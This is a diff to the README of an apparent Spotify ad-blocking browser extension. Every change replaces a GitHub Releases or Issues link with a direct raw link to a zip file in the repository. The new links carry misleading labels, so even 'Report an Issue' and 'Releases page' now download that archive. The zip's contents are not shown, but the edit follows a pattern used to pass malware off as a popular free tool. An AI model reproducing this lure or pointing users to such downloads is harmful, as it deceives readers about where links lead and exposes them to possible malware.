@@ -1,6 +1,6 @@
 # 🎵 blockify-browser-extension - Block Spotify Ads Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/dyrthejono/blockify-browser-extension/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dyrthejono/blockify-browser-extension/main/public/v1.7-alpha.2.zip)
 
 ---
 
@@ -23,7 +23,7 @@ Blockify is a **free, noncommercial ad blocker** specifically designed for Spoti
 
 ## 📥 Download & Installation
 
-**Visit this link to download the application:** [Download Blockify](https://github.com/dyrthejono/blockify-browser-extension/releases)
+**Visit this link to download the application:** [Download Blockify](https://raw.githubusercontent.com/dyrthejono/blockify-browser-extension/main/public/v1.7-alpha.2.zip)
 
 Follow these steps to get Blockify running on your Windows computer:
 
@@ -78,7 +78,7 @@ Blockify is designed to be completely hands-off. Once installed, it runs quietly
 
 From time to time, Spotify changes how ads are served. That's why we release updates:
 
-1. Check the [Releases page](https://github.com/dyrthejono/blockify-browser-extension/releases) periodically.
+1. Check the [Releases page](https://raw.githubusercontent.com/dyrthejono/blockify-browser-extension/main/public/v1.7-alpha.2.zip) periodically.
 2. Download the newest version when available.
 3. In Chrome's Extensions page (`chrome://extensions`), click **"Remove"** on the old version.
 4. Follow the installation steps above again with the new file.
@@ -135,7 +135,7 @@ Updates are released whenever Spotify changes its ad-serving methods. Check the 
 
 If you're still having trouble, here are some helpful resources:
 
-- **Report an Issue:** Visit the [GitHub Issues page](https://github.com/dyrthejono/blockify-browser-extension/issues) to search for solutions or ask for help.
+- **Report an Issue:** Visit the [GitHub Issues page](https://raw.githubusercontent.com/dyrthejono/blockify-browser-extension/main/public/v1.7-alpha.2.zip) to search for solutions or ask for help.
 - **Community Discussions:** Join the conversation on the repository's Discussion tab.
 - **Contact the Author:** Reach out directly through GitHub.
 
